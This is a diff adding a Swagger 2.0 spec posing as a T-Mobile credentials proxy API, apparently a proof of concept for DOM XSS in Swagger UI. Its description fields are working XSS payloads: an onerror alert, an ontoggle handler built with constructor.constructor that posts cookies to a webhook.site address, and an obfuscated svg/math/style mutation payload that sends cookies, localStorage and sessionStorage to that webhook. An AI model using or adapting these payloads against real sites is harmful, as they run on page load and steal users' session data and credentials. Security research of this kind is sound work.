@@ -1,0 +1,54 @@
+swagger: '2.0'
+info:
+  title: "T-Mobile Credentials Proxy API"
+  description: |
+    <img src=x onerror="alert('🔥 DOM XSS in T-Mobile Swagger UI v4.15.5 🔥\\nDomain: ' + document.domain + '\\nURL: ' + window.location.href)">
+  version: '1.0'
+host: cap-uipa-rpa-proxy.t-mobile.com
+basePath: /api/v1
+schemes:
+  - https
+paths:
+  /credential-stores:
+    get:
+      summary: "Get credential stores"
+      description: |
+        <details open ontoggle="[].constructor.constructor('fetch(\"https://webhook.site/your-unique-id\", {method: \"POST\", body: JSON.stringify({alert: \"XSS_TRIGGERED\", domain: document.domain, cookies: document.cookie, userAgent: navigator.userAgent})})')()">
+        <summary>Credential Store Operations</summary>
+        This endpoint manages credential stores.
+        </details>
+      responses:
+        '200':
+          description: Success
+        '401':
+          description: Unauthorized
+  /test:
+    get:
+      summary: "XSS Test Endpoint"
+      description: |
+        <svg><foreignObject><math><mi><mglyph><style><img src onerror="
+        // Advanced payload for data exfiltration
+        const payload = {
+          timestamp: new Date().toISOString(),
+          domain: document.domain,
+          url: window.location.href,
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          userAgent: navigator.userAgent,
+          referrer: document.referrer
+        };
+        
+        // Send to your webhook
+        fetch('https://webhook.site/your-unique-id', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        }).then(r => console.log('Data exfiltrated'));
+        
+        // Also show visible proof
+        alert('SUCCESS: DOM XSS in T-Mobile Swagger UI');
+        "></style></mglyph></mi></math></foreignObject></svg>
+      responses:
+        '200':
+          description: XSS test successful
